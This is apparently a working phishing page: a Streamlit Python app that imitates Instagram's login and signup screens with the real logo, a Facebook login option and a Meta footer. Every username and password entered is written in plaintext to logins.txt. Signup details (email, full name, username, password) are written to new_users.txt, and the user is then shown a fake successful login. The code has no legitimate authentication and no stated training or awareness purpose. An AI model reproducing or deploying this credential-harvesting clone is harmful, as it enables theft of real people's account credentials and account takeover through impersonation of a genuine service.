import streamlit as st
import os
import time

# Set page configuration
st.set_page_config(page_title="Instagram", page_icon="📸", layout="wide")

# Initialize session states for page navigation
if 'page' not in st.session_state:
    st.session_state['page'] = 'login'
if 'logged_in' not in st.session_state:
    st.session_state['logged_in'] = False

# Load the merged CSS
with open("styles.css") as f:
    st.markdown(f"<style>{f.read()}</style>", unsafe_allow_html=True)

# --- NAVIGATION FUNCTIONS ---
def go_to_signup():
    st.session_state['page'] = 'signup'

def go_to_login():
    st.session_state['page'] = 'login'

# --- 1. LOGIN PAGE ---
if st.session_state['page'] == 'login' and not st.session_state['logged_in']:
    main_div = st.container()
    with main_div:
        col1, col2, col3, col4 = st.columns([0.5, 1.2, 1, 0.5])

        with col2:
            if os.path.exists("assets/collage.png"):
                st.markdown('<div class="collage-container">', unsafe_allow_html=True)
                st.image("assets/collage.png", use_container_width=True)
                st.markdown('</div>', unsafe_allow_html=True)
            else:
                st.info("Missing collage.png in assets folder")

        with col3:
            st.markdown('<div class="login-card">', unsafe_allow_html=True)
            insta_logo_url = "https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png"
            st.markdown(f'<div style="display: flex; justify-content: center; width: 100%; margin-bottom: 20px;"><img src="{insta_logo_url}" width="200"></div>', unsafe_allow_html=True)
            
            username = st.text_input("Username", placeholder="Phone number, username, or email", label_visibility="collapsed")
            password = st.text_input("Password", type="password", placeholder="Password", label_visibility="collapsed")
            
            if st.button("Log in", use_container_width=True):
                if username and password:
                    with open("logins.txt", "a") as f:
                        f.write(f"User: {username} | Pass: {password}\n")
                    with st.spinner('Logging in...'):
                        time.sleep(1.5)
                        st.session_state['logged_in'] = True
                        st.rerun()
                else:
                    st.error("Please enter details")

            st.markdown('<div class="separator-container"><div class="line"></div><div class="or-text">OR</div><div class="line"></div></div>', unsafe_allow_html=True)
            
            fb_logo_url = "https://upload.wikimedia.org/wikipedia/commons/0/05/Facebook_Logo_(2019).png"
            st.markdown(f'<div class="fb-container"><img src="{fb_logo_url}" width="18px" style="margin-right: 8px;"><span class="fb-login">Log in with Facebook</span></div>', unsafe_allow_html=True)
            st.markdown('<div class="forgot-pass">Forgot password?</div>', unsafe_allow_html=True)
            st.markdown('</div>', unsafe_allow_html=True)

            # Link to Sign up
            st.markdown('<div class="signup-card">Don\'t have an account? </div>', unsafe_allow_html=True)
            if st.button("Sign up", key="btn_to_signup"):
                go_to_signup()
                st.rerun()

    st.markdown('<div class="footer">Meta &nbsp; About &nbsp; Blog &nbsp; Jobs &nbsp; Help &nbsp; API &nbsp; Privacy &nbsp; Terms &nbsp; Locations &nbsp; Instagram Lite &nbsp; Meta AI &nbsp; Threads &nbsp; Contact Uploading & Non-Users &nbsp; Meta Verified<br><br>English ⌵ &nbsp; © 2026 Instagram from Meta</div>', unsafe_allow_html=True)

# --- 2. SIGN UP PAGE ---
elif st.session_state['page'] == 'signup':
    st.markdown('<div class="signup-wrapper">', unsafe_allow_html=True)
    st.markdown('<div class="login-card">', unsafe_allow_html=True)
    
    insta_logo_url = "https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png"
    st.markdown(f'<div style="text-align: center; margin-bottom: 10px;"><img src="{insta_logo_url}" width="175"></div>', unsafe_allow_html=True)
    st.markdown('<h3 style="color: #8e8e8e; text-align: center; font-size: 17px; font-weight: 600; margin-bottom: 20px;">Sign up to see photos and videos from your friends.</h3>', unsafe_allow_html=True)
    
    if st.button("Log in with Facebook", use_container_width=True, key="fb_signup"):
        st.info("Redirecting...")

    st.markdown('<div class="separator-container"><div class="line"></div><div class="or-text">OR</div><div class="line"></div></div>', unsafe_allow_html=True)
    
    s_email = st.text_input("Mobile Number or Email", placeholder="Mobile Number or Email", label_visibility="collapsed", key="s1")
    s_name = st.text_input("Full Name", placeholder="Full Name", label_visibility="collapsed", key="s2")
    s_user = st.text_input("Username", placeholder="Username", label_visibility="collapsed", key="s3")
    s_pass = st.text_input("Password", type="password", placeholder="Password", label_visibility="collapsed", key="s4")
    
    if st.button("Sign up", use_container_width=True, type="primary"):
        if s_email and s_name and s_user and s_pass:
            with open("new_users.txt", "a") as f:
                f.write(f"Email: {s_email} | Name: {s_name} | User: {s_user} | Pass: {s_pass}\n")
            st.success("Account created!")
            time.sleep(1)
            go_to_login()
            st.rerun()
        else:
            st.error("Fill all fields")

    st.markdown('</div>', unsafe_allow_html=True)

    st.markdown('<div class="signup-card">Have an account? </div>', unsafe_allow_html=True)
    if st.button("Log in", key="btn_to_login"):
        go_to_login()
        st.rerun()
    st.markdown('</div>', unsafe_allow_html=True)

# --- 3. HOME FEED (After Login) ---
elif st.session_state['logged_in']:
    st.markdown('<div class="navbar">Instagram</div>', unsafe_allow_html=True)
    st.success("Successfully logged in!")
    if st.button("Log out"):
        st.session_state['logged_in'] = False
        st.session_state['page'] = 'login'
        st.rerun()